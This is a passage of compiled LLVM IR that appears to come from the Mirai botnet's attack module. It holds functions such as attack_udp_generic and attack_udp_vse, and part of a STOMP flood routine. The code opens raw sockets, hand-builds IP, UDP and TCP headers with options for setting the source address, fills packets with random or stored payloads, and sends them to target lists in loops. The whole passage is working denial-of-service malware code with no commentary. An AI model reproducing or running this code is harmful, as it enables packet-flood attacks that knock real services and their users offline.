  %246 = sext i32 %storemerge139160.us to i64
  %247 = getelementptr inbounds i8*, i8** %14, i64 %246
  %248 = load i8*, i8** %247, align 8
  %249 = bitcast i8* %248 to %struct.iphdr*
  %250 = getelementptr inbounds i8, i8* %248, i64 20
  %251 = getelementptr inbounds i8, i8* %248, i64 4
  %252 = bitcast i8* %251 to i16*
  store i16 0, i16* %252, align 4
  br i1 %137, label %255, label %253

; <label>:253:                                    ; preds = %.lr.ph.split.us
  %254 = getelementptr inbounds i8, i8* %248, i64 40
  call void @rand_str(i8* %254, i32 %37)
  br label %255

; <label>:255:                                    ; preds = %253, %.lr.ph.split.us
  %256 = getelementptr inbounds i8, i8* %248, i64 10
  %257 = bitcast i8* %256 to i16*
  store i16 0, i16* %257, align 2
  %258 = bitcast i8* %248 to i16*
  %259 = call zeroext i16 @checksum_generic(i16* %258, i32 20) #9
  store i16 %259, i16* %257, align 2
  %260 = load i32, i32* %5, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %261, i32 1
  %263 = load i32, i32* %262, align 4
  %264 = add i32 %263, 1
  store i32 %264, i32* %262, align 4
  %265 = trunc i32 %263 to i16
  %266 = call zeroext i16 @htons(i16 zeroext %265) #10
  %267 = zext i16 %266 to i32
  %268 = getelementptr inbounds i8, i8* %248, i64 24
  %269 = bitcast i8* %268 to i32*
  store i32 %267, i32* %269, align 4
  %270 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %261, i32 2
  %271 = load i32, i32* %270, align 4
  %272 = trunc i32 %271 to i16
  %273 = call zeroext i16 @htons(i16 zeroext %272) #10
  %274 = zext i16 %273 to i32
  %275 = getelementptr inbounds i8, i8* %248, i64 28
  %276 = bitcast i8* %275 to i32*
  store i32 %274, i32* %276, align 4
  %277 = getelementptr inbounds i8, i8* %248, i64 36
  %278 = bitcast i8* %277 to i16*
  store i16 0, i16* %278, align 4
  %279 = call zeroext i16 @htons(i16 zeroext %139) #10
  %280 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %249, i8* %250, i16 zeroext %279, i32 %140) #9
  store i16 %280, i16* %278, align 4
  %281 = getelementptr inbounds i8, i8* %248, i64 22
  %282 = bitcast i8* %281 to i16*
  %283 = load i16, i16* %282, align 2
  %284 = load i32, i32* %5, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %285, i32 0, i32 1
  store i16 %283, i16* %286, align 2
  %287 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %285, i32 0
  %288 = bitcast %struct.sockaddr_in* %287 to %struct.sockaddr*
  %289 = call i64 @sendto(i32 %40, i8* %248, i64 %.pre-phi175, i32 16384, %struct.sockaddr* %288, i32 16) #9
  %290 = load i32, i32* %5, align 4
  %291 = add nsw i32 %290, 1
  store i32 %291, i32* %5, align 4
  %292 = icmp slt i32 %291, %46
  br i1 %292, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %300
  %storemerge139160 = phi i32 [ %336, %300 ], [ 0, %.lr.ph.split.preheader ]
  %293 = sext i32 %storemerge139160 to i64
  %294 = getelementptr inbounds i8*, i8** %14, i64 %293
  %295 = load i8*, i8** %294, align 8
  %296 = bitcast i8* %295 to %struct.iphdr*
  %297 = getelementptr inbounds i8, i8* %295, i64 20
  br i1 %137, label %300, label %298

; <label>:298:                                    ; preds = %.lr.ph.split
  %299 = getelementptr inbounds i8, i8* %295, i64 40
  call void @rand_str(i8* %299, i32 %37)
  br label %300

; <label>:300:                                    ; preds = %.lr.ph.split, %298
  %301 = getelementptr inbounds i8, i8* %295, i64 10
  %302 = bitcast i8* %301 to i16*
  store i16 0, i16* %302, align 2
  %303 = bitcast i8* %295 to i16*
  %304 = call zeroext i16 @checksum_generic(i16* %303, i32 20) #9
  store i16 %304, i16* %302, align 2
  %305 = load i32, i32* %5, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %306, i32 1
  %308 = load i32, i32* %307, align 4
  %309 = add i32 %308, 1
  store i32 %309, i32* %307, align 4
  %310 = trunc i32 %308 to i16
  %311 = call zeroext i16 @htons(i16 zeroext %310) #10
  %312 = zext i16 %311 to i32
  %313 = getelementptr inbounds i8, i8* %295, i64 24
  %314 = bitcast i8* %313 to i32*
  store i32 %312, i32* %314, align 4
  %315 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %306, i32 2
  %316 = load i32, i32* %315, align 4
  %317 = trunc i32 %316 to i16
  %318 = call zeroext i16 @htons(i16 zeroext %317) #10
  %319 = zext i16 %318 to i32
  %320 = getelementptr inbounds i8, i8* %295, i64 28
  %321 = bitcast i8* %320 to i32*
  store i32 %319, i32* %321, align 4
  %322 = getelementptr inbounds i8, i8* %295, i64 36
  %323 = bitcast i8* %322 to i16*
  store i16 0, i16* %323, align 4
  %324 = call zeroext i16 @htons(i16 zeroext %139) #10
  %325 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %296, i8* %297, i16 zeroext %324, i32 %140) #9
  store i16 %325, i16* %323, align 4
  %326 = getelementptr inbounds i8, i8* %295, i64 22
  %327 = bitcast i8* %326 to i16*
  %328 = load i16, i16* %327, align 2
  %329 = load i32, i32* %5, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %330, i32 0, i32 1
  store i16 %328, i16* %331, align 2
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %330, i32 0
  %333 = bitcast %struct.sockaddr_in* %332 to %struct.sockaddr*
  %334 = call i64 @sendto(i32 %40, i8* %295, i64 %.pre-phi175, i32 16384, %struct.sockaddr* %333, i32 16) #9
  %335 = load i32, i32* %5, align 4
  %336 = add nsw i32 %335, 1
  store i32 %336, i32* %5, align 4
  %337 = icmp slt i32 %336, %46
  br i1 %337, label %.lr.ph.split, label %.loopexit.loopexit202

.loopexit150.loopexit:                            ; preds = %103
  br label %.loopexit150

.loopexit150.loopexit203:                         ; preds = %159
  br label %.loopexit150

.loopexit150:                                     ; preds = %.loopexit150.loopexit203, %.loopexit150.loopexit, %4, %82
  ret void
}

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) local_unnamed_addr #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #9
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %22 = trunc i32 %21 to i16
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %24 = trunc i32 %23 to i8
  %25 = load i32, i32* @LOCAL_ADDR, align 4
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %25)
  %27 = and i32 %21, 65535
  %28 = icmp ugt i32 %27, 1460
  %. = select i1 %28, i16 1460, i16 %22
  %29 = tail call i32 @socket(i32 2, i32 3, i32 17) #9
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %219, label %31

; <label>:31:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %32 = bitcast i32* %5 to i8*
  %33 = call i32 @setsockopt(i32 %29, i32 0, i32 3, i8* nonnull %32, i32 4) #9
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %68, label %.preheader84

.preheader84:                                     ; preds = %31
  store i32 0, i32* %5, align 4
  %35 = zext i8 %0 to i32
  %36 = icmp eq i8 %0, 0
  br i1 %36, label %.preheader, label %.lr.ph86

.lr.ph86:                                         ; preds = %.preheader84
  %37 = add i16 %., 28
  %38 = icmp eq i8 %16, 0
  %39 = add i16 %., 8
  %40 = zext i8 %0 to i64
  br i1 %38, label %.lr.ph86.split.us.preheader, label %.lr.ph86.split.preheader

.lr.ph86.split.preheader:                         ; preds = %.lr.ph86
  br label %.lr.ph86.split

.lr.ph86.split.us.preheader:                      ; preds = %.lr.ph86
  br label %.lr.ph86.split.us

.lr.ph86.split.us:                                ; preds = %.lr.ph86.split.us.preheader, %.lr.ph86.split.us
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph86.split.us ], [ 0, %.lr.ph86.split.us.preheader ]
  %41 = call noalias i8* @calloc(i64 1510, i64 1) #9
  %42 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %41, i8** %42, align 8
  %43 = getelementptr inbounds i8, i8* %41, i64 20
  store i8 69, i8* %41, align 4
  %44 = getelementptr inbounds i8, i8* %41, i64 1
  store i8 %10, i8* %44, align 1
  %45 = call zeroext i16 @htons(i16 zeroext %37) #10
  %46 = getelementptr inbounds i8, i8* %41, i64 2
  %47 = bitcast i8* %46 to i16*
  store i16 %45, i16* %47, align 2
  %48 = call zeroext i16 @htons(i16 zeroext %12) #10
  %49 = getelementptr inbounds i8, i8* %41, i64 4
  %50 = bitcast i8* %49 to i16*
  store i16 %48, i16* %50, align 4
  %51 = getelementptr inbounds i8, i8* %41, i64 8
  store i8 %14, i8* %51, align 4
  %52 = getelementptr inbounds i8, i8* %41, i64 9
  store i8 17, i8* %52, align 1
  %53 = getelementptr inbounds i8, i8* %41, i64 12
  %54 = bitcast i8* %53 to i32*
  store i32 %26, i32* %54, align 4
  %55 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %56 = load i32, i32* %55, align 4
  %57 = getelementptr inbounds i8, i8* %41, i64 16
  %58 = bitcast i8* %57 to i32*
  store i32 %56, i32* %58, align 4
  %59 = call zeroext i16 @htons(i16 zeroext %18) #10
  %60 = bitcast i8* %43 to i16*
  store i16 %59, i16* %60, align 2
  %61 = call zeroext i16 @htons(i16 zeroext %20) #10
  %62 = getelementptr inbounds i8, i8* %41, i64 22
  %63 = bitcast i8* %62 to i16*
  store i16 %61, i16* %63, align 2
  %64 = call zeroext i16 @htons(i16 zeroext %39) #10
  %65 = getelementptr inbounds i8, i8* %41, i64 24
  %66 = bitcast i8* %65 to i16*
  store i16 %64, i16* %66, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %67 = icmp slt i64 %indvars.iv.next, %40
  br i1 %67, label %.lr.ph86.split.us, label %..preheader_crit_edge.loopexit

; <label>:68:                                     ; preds = %31
  %69 = call i32 @close(i32 %29) #9
  br label %219

..preheader_crit_edge.loopexit:                   ; preds = %.lr.ph86.split.us
  br label %..preheader_crit_edge

..preheader_crit_edge.loopexit98:                 ; preds = %.lr.ph86.split
  br label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %..preheader_crit_edge.loopexit98, %..preheader_crit_edge.loopexit
  %.lcssa87.in = phi i64 [ %indvars.iv.next, %..preheader_crit_edge.loopexit ], [ %indvars.iv.next92, %..preheader_crit_edge.loopexit98 ]
  %.lcssa87 = trunc i64 %.lcssa87.in to i32
  store i32 %.lcssa87, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader84, %..preheader_crit_edge
  %70 = icmp eq i32 %26, -1
  %71 = and i32 %11, 65535
  %72 = icmp eq i32 %71, 65535
  %73 = and i32 %17, 65535
  %74 = icmp eq i32 %73, 65535
  %75 = and i32 %19, 65535
  %76 = icmp eq i32 %75, 65535
  %77 = icmp eq i8 %24, 0
  %78 = zext i16 %. to i64
  %79 = add nuw nsw i64 %78, 8
  %80 = trunc i64 %79 to i32
  %81 = add nuw nsw i64 %78, 28
  %82 = zext i16 %. to i32
  br label %.loopexit

.lr.ph86.split:                                   ; preds = %.lr.ph86.split.preheader, %.lr.ph86.split
  %indvars.iv91 = phi i64 [ %indvars.iv.next92, %.lr.ph86.split ], [ 0, %.lr.ph86.split.preheader ]
  %83 = call noalias i8* @calloc(i64 1510, i64 1) #9
  %84 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv91
  store i8* %83, i8** %84, align 8
  %85 = getelementptr inbounds i8, i8* %83, i64 20
  store i8 69, i8* %83, align 4
  %86 = getelementptr inbounds i8, i8* %83, i64 1
  store i8 %10, i8* %86, align 1
  %87 = call zeroext i16 @htons(i16 zeroext %37) #10
  %88 = getelementptr inbounds i8, i8* %83, i64 2
  %89 = bitcast i8* %88 to i16*
  store i16 %87, i16* %89, align 2
  %90 = call zeroext i16 @htons(i16 zeroext %12) #10
  %91 = getelementptr inbounds i8, i8* %83, i64 4
  %92 = bitcast i8* %91 to i16*
  store i16 %90, i16* %92, align 4
  %93 = getelementptr inbounds i8, i8* %83, i64 8
  store i8 %14, i8* %93, align 4
  %94 = call zeroext i16 @htons(i16 zeroext 16384) #10
  %95 = getelementptr inbounds i8, i8* %83, i64 6
  %96 = bitcast i8* %95 to i16*
  store i16 %94, i16* %96, align 2
  %97 = getelementptr inbounds i8, i8* %83, i64 9
  store i8 17, i8* %97, align 1
  %98 = getelementptr inbounds i8, i8* %83, i64 12
  %99 = bitcast i8* %98 to i32*
  store i32 %26, i32* %99, align 4
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv91, i32 1
  %101 = load i32, i32* %100, align 4
  %102 = getelementptr inbounds i8, i8* %83, i64 16
  %103 = bitcast i8* %102 to i32*
  store i32 %101, i32* %103, align 4
  %104 = call zeroext i16 @htons(i16 zeroext %18) #10
  %105 = bitcast i8* %85 to i16*
  store i16 %104, i16* %105, align 2
  %106 = call zeroext i16 @htons(i16 zeroext %20) #10
  %107 = getelementptr inbounds i8, i8* %83, i64 22
  %108 = bitcast i8* %107 to i16*
  store i16 %106, i16* %108, align 2
  %109 = call zeroext i16 @htons(i16 zeroext %39) #10
  %110 = getelementptr inbounds i8, i8* %83, i64 24
  %111 = bitcast i8* %110 to i16*
  store i16 %109, i16* %111, align 2
  %indvars.iv.next92 = add nsw i64 %indvars.iv91, 1
  %112 = icmp slt i64 %indvars.iv.next92, %40
  br i1 %112, label %.lr.ph86.split, label %..preheader_crit_edge.loopexit98

.loopexit.loopexit:                               ; preds = %144
  br label %.loopexit.backedge

.loopexit.loopexit97:                             ; preds = %196
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %36, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit97
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %70, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %144
  %storemerge8385.us = phi i32 [ %165, %144 ], [ 0, %.lr.ph.split.us.preheader ]
  %113 = sext i32 %storemerge8385.us to i64
  %114 = getelementptr inbounds i8*, i8** %8, i64 %113
  %115 = load i8*, i8** %114, align 8
  %116 = bitcast i8* %115 to %struct.iphdr*
  %117 = getelementptr inbounds i8, i8* %115, i64 20
  %118 = getelementptr inbounds i8, i8* %115, i64 28
  %119 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %113, i32 2
  %120 = load i8, i8* %119, align 4
  %121 = icmp ult i8 %120, 32
  br i1 %121, label %122, label %129

; <label>:122:                                    ; preds = %.lr.ph.split.us
  %123 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %113, i32 1
  %124 = load i32, i32* %123, align 4
  %125 = call i32 @ntohl(i32 %124) #10
  %126 = call i32 @htonl(i32 %125) #10
  %127 = getelementptr inbounds i8, i8* %115, i64 16
  %128 = bitcast i8* %127 to i32*
  store i32 %126, i32* %128, align 4
  br label %129

; <label>:129:                                    ; preds = %.lr.ph.split.us, %122
  %130 = getelementptr inbounds i8, i8* %115, i64 12
  %131 = bitcast i8* %130 to i32*
  store i32 0, i32* %131, align 4
  br i1 %72, label %132, label %135

; <label>:132:                                    ; preds = %129
  %133 = getelementptr inbounds i8, i8* %115, i64 4
  %134 = bitcast i8* %133 to i16*
  store i16 0, i16* %134, align 4
  br label %135

; <label>:135:                                    ; preds = %132, %129
  br i1 %74, label %136, label %138

; <label>:136:                                    ; preds = %135
  %137 = bitcast i8* %117 to i16*
  store i16 0, i16* %137, align 2
  br label %138

; <label>:138:                                    ; preds = %136, %135
  br i1 %76, label %139, label %142

; <label>:139:                                    ; preds = %138
  %140 = getelementptr inbounds i8, i8* %115, i64 22
  %141 = bitcast i8* %140 to i16*
  store i16 0, i16* %141, align 2
  br label %142

; <label>:142:                                    ; preds = %139, %138
  br i1 %77, label %144, label %143

; <label>:143:                                    ; preds = %142
  call void @rand_str(i8* nonnull %118, i32 %82)
  br label %144

; <label>:144:                                    ; preds = %143, %142
  %145 = getelementptr inbounds i8, i8* %115, i64 10
  %146 = bitcast i8* %145 to i16*
  store i16 0, i16* %146, align 2
  %147 = bitcast i8* %115 to i16*
  %148 = call zeroext i16 @checksum_generic(i16* %147, i32 20) #9
  store i16 %148, i16* %146, align 2
  %149 = getelementptr inbounds i8, i8* %115, i64 26
  %150 = bitcast i8* %149 to i16*
  store i16 0, i16* %150, align 2
  %151 = getelementptr inbounds i8, i8* %115, i64 24
  %152 = bitcast i8* %151 to i16*
  %153 = load i16, i16* %152, align 2
  %154 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %116, i8* nonnull %117, i16 zeroext %153, i32 %80) #9
  store i16 %154, i16* %150, align 2
  %155 = getelementptr inbounds i8, i8* %115, i64 22
  %156 = bitcast i8* %155 to i16*
  %157 = load i16, i16* %156, align 2
  %158 = load i32, i32* %5, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %159, i32 0, i32 1
  store i16 %157, i16* %160, align 2
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %159, i32 0
  %162 = bitcast %struct.sockaddr_in* %161 to %struct.sockaddr*
  %163 = call i64 @sendto(i32 %29, i8* nonnull %115, i64 %81, i32 16384, %struct.sockaddr* %162, i32 16) #9
  %164 = load i32, i32* %5, align 4
  %165 = add nsw i32 %164, 1
  store i32 %165, i32* %5, align 4
  %166 = icmp slt i32 %165, %35
  br i1 %166, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %196
  %storemerge8385 = phi i32 [ %217, %196 ], [ 0, %.lr.ph.split.preheader ]
  %167 = sext i32 %storemerge8385 to i64
  %168 = getelementptr inbounds i8*, i8** %8, i64 %167
  %169 = load i8*, i8** %168, align 8
  %170 = bitcast i8* %169 to %struct.iphdr*
  %171 = getelementptr inbounds i8, i8* %169, i64 20
  %172 = getelementptr inbounds i8, i8* %169, i64 28
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %167, i32 2
  %174 = load i8, i8* %173, align 4
  %175 = icmp ult i8 %174, 32
  br i1 %175, label %176, label %183

; <label>:176:                                    ; preds = %.lr.ph.split
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %167, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = call i32 @ntohl(i32 %178) #10
  %180 = call i32 @htonl(i32 %179) #10
  %181 = getelementptr inbounds i8, i8* %169, i64 16
  %182 = bitcast i8* %181 to i32*
  store i32 %180, i32* %182, align 4
  br label %183

; <label>:183:                                    ; preds = %.lr.ph.split, %176
  br i1 %72, label %184, label %187

; <label>:184:                                    ; preds = %183
  %185 = getelementptr inbounds i8, i8* %169, i64 4
  %186 = bitcast i8* %185 to i16*
  store i16 0, i16* %186, align 4
  br label %187

; <label>:187:                                    ; preds = %184, %183
  br i1 %74, label %188, label %190

; <label>:188:                                    ; preds = %187
  %189 = bitcast i8* %171 to i16*
  store i16 0, i16* %189, align 2
  br label %190

; <label>:190:                                    ; preds = %188, %187
  br i1 %76, label %191, label %194

; <label>:191:                                    ; preds = %190
  %192 = getelementptr inbounds i8, i8* %169, i64 22
  %193 = bitcast i8* %192 to i16*
  store i16 0, i16* %193, align 2
  br label %194

; <label>:194:                                    ; preds = %191, %190
  br i1 %77, label %196, label %195

; <label>:195:                                    ; preds = %194
  call void @rand_str(i8* %172, i32 %82)
  br label %196

; <label>:196:                                    ; preds = %194, %195
  %197 = getelementptr inbounds i8, i8* %169, i64 10
  %198 = bitcast i8* %197 to i16*
  store i16 0, i16* %198, align 2
  %199 = bitcast i8* %169 to i16*
  %200 = call zeroext i16 @checksum_generic(i16* %199, i32 20) #9
  store i16 %200, i16* %198, align 2
  %201 = getelementptr inbounds i8, i8* %169, i64 26
  %202 = bitcast i8* %201 to i16*
  store i16 0, i16* %202, align 2
  %203 = getelementptr inbounds i8, i8* %169, i64 24
  %204 = bitcast i8* %203 to i16*
  %205 = load i16, i16* %204, align 2
  %206 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %170, i8* %171, i16 zeroext %205, i32 %80) #9
  store i16 %206, i16* %202, align 2
  %207 = getelementptr inbounds i8, i8* %169, i64 22
  %208 = bitcast i8* %207 to i16*
  %209 = load i16, i16* %208, align 2
  %210 = load i32, i32* %5, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %211, i32 0, i32 1
  store i16 %209, i16* %212, align 2
  %213 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %211, i32 0
  %214 = bitcast %struct.sockaddr_in* %213 to %struct.sockaddr*
  %215 = call i64 @sendto(i32 %29, i8* %169, i64 %81, i32 16384, %struct.sockaddr* %214, i32 16) #9
  %216 = load i32, i32* %5, align 4
  %217 = add nsw i32 %216, 1
  store i32 %217, i32* %5, align 4
  %218 = icmp slt i32 %217, %35
  br i1 %218, label %.lr.ph.split, label %.loopexit.loopexit97

; <label>:219:                                    ; preds = %4, %68
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = zext i8 %0 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #9
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 27015)
  %21 = trunc i32 %20 to i16
  tail call void @table_unlock_val(i8 zeroext 29)
  %22 = call i8* @table_retrieve_val(i32 29, i32* nonnull %6)
  %23 = call i32 @socket(i32 2, i32 3, i32 17) #9
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %217, label %25

; <label>:25:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %26 = bitcast i32* %5 to i8*
  %27 = call i32 @setsockopt(i32 %23, i32 0, i32 3, i8* nonnull %26, i32 4) #9
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %71, label %.preheader71

.preheader71:                                     ; preds = %25
  store i32 0, i32* %5, align 4
  %29 = zext i8 %0 to i32
  %30 = icmp eq i8 %0, 0
  br i1 %30, label %.preheader, label %.lr.ph73

.lr.ph73:                                         ; preds = %.preheader71
  %31 = icmp eq i8 %17, 0
  br i1 %31, label %.lr.ph73.split.us.preheader, label %.lr.ph73.split.preheader

.lr.ph73.split.preheader:                         ; preds = %.lr.ph73
  br label %.lr.ph73.split

.lr.ph73.split.us.preheader:                      ; preds = %.lr.ph73
  br label %.lr.ph73.split.us

.lr.ph73.split.us:                                ; preds = %.lr.ph73.split.us.preheader, %.lr.ph73.split.us
  %32 = phi i32 [ %69, %.lr.ph73.split.us ], [ 0, %.lr.ph73.split.us.preheader ]
  %33 = call noalias i8* @calloc(i64 128, i64 1) #9
  %34 = sext i32 %32 to i64
  %35 = getelementptr inbounds i8*, i8** %9, i64 %34
  store i8* %33, i8** %35, align 8
  %36 = getelementptr inbounds i8, i8* %33, i64 20
  %37 = getelementptr inbounds i8, i8* %33, i64 28
  store i8 69, i8* %33, align 4
  %38 = getelementptr inbounds i8, i8* %33, i64 1
  store i8 %11, i8* %38, align 1
  %39 = load i32, i32* %6, align 4
  %40 = trunc i32 %39 to i16
  %41 = add i16 %40, 32
  %42 = call zeroext i16 @htons(i16 zeroext %41) #10
  %43 = getelementptr inbounds i8, i8* %33, i64 2
  %44 = bitcast i8* %43 to i16*
  store i16 %42, i16* %44, align 2
  %45 = call zeroext i16 @htons(i16 zeroext %13) #10
  %46 = getelementptr inbounds i8, i8* %33, i64 4
  %47 = bitcast i8* %46 to i16*
  store i16 %45, i16* %47, align 4
  %48 = getelementptr inbounds i8, i8* %33, i64 8
  store i8 %15, i8* %48, align 4
  %49 = getelementptr inbounds i8, i8* %33, i64 9
  store i8 17, i8* %49, align 1
  %50 = load i32, i32* @LOCAL_ADDR, align 4
  %51 = getelementptr inbounds i8, i8* %33, i64 12
  %52 = bitcast i8* %51 to i32*
  store i32 %50, i32* %52, align 4
  %53 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %34, i32 1
  %54 = load i32, i32* %53, align 4
  %55 = getelementptr inbounds i8, i8* %33, i64 16
  %56 = bitcast i8* %55 to i32*
  store i32 %54, i32* %56, align 4
  %57 = call zeroext i16 @htons(i16 zeroext %19) #10
  %58 = bitcast i8* %36 to i16*
  store i16 %57, i16* %58, align 2
  %59 = call zeroext i16 @htons(i16 zeroext %21) #10
  %60 = getelementptr inbounds i8, i8* %33, i64 22
  %61 = bitcast i8* %60 to i16*
  store i16 %59, i16* %61, align 2
  %62 = add i16 %40, 12
  %63 = call zeroext i16 @htons(i16 zeroext %62) #10
  %64 = getelementptr inbounds i8, i8* %33, i64 24
  %65 = bitcast i8* %64 to i16*
  store i16 %63, i16* %65, align 2
  %66 = bitcast i8* %37 to i32*
  store i32 -1, i32* %66, align 4
  %67 = getelementptr inbounds i8, i8* %33, i64 32
  call void @util_memcpy(i8* %67, i8* %22, i32 %39) #9
  %68 = load i32, i32* %5, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %5, align 4
  %70 = icmp slt i32 %69, %29
  br i1 %70, label %.lr.ph73.split.us, label %.preheader.loopexit

; <label>:71:                                     ; preds = %25
  %72 = call i32 @close(i32 %23) #9
  br label %217

.preheader.loopexit:                              ; preds = %.lr.ph73.split.us
  br label %.preheader

.preheader.loopexit88:                            ; preds = %.lr.ph73.split
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit88, %.preheader.loopexit, %.preheader71
  %73 = and i32 %12, 65535
  %74 = icmp eq i32 %73, 65535
  %75 = and i32 %18, 65535
  %76 = icmp eq i32 %75, 65535
  %77 = and i32 %20, 65535
  %78 = icmp eq i32 %77, 65535
  br label %.loopexit

.lr.ph73.split:                                   ; preds = %.lr.ph73.split.preheader, %.lr.ph73.split
  %79 = phi i32 [ %119, %.lr.ph73.split ], [ 0, %.lr.ph73.split.preheader ]
  %80 = call noalias i8* @calloc(i64 128, i64 1) #9
  %81 = sext i32 %79 to i64
  %82 = getelementptr inbounds i8*, i8** %9, i64 %81
  store i8* %80, i8** %82, align 8
  %83 = getelementptr inbounds i8, i8* %80, i64 20
  %84 = getelementptr inbounds i8, i8* %80, i64 28
  store i8 69, i8* %80, align 4
  %85 = getelementptr inbounds i8, i8* %80, i64 1
  store i8 %11, i8* %85, align 1
  %86 = load i32, i32* %6, align 4
  %87 = trunc i32 %86 to i16
  %88 = add i16 %87, 32
  %89 = call zeroext i16 @htons(i16 zeroext %88) #10
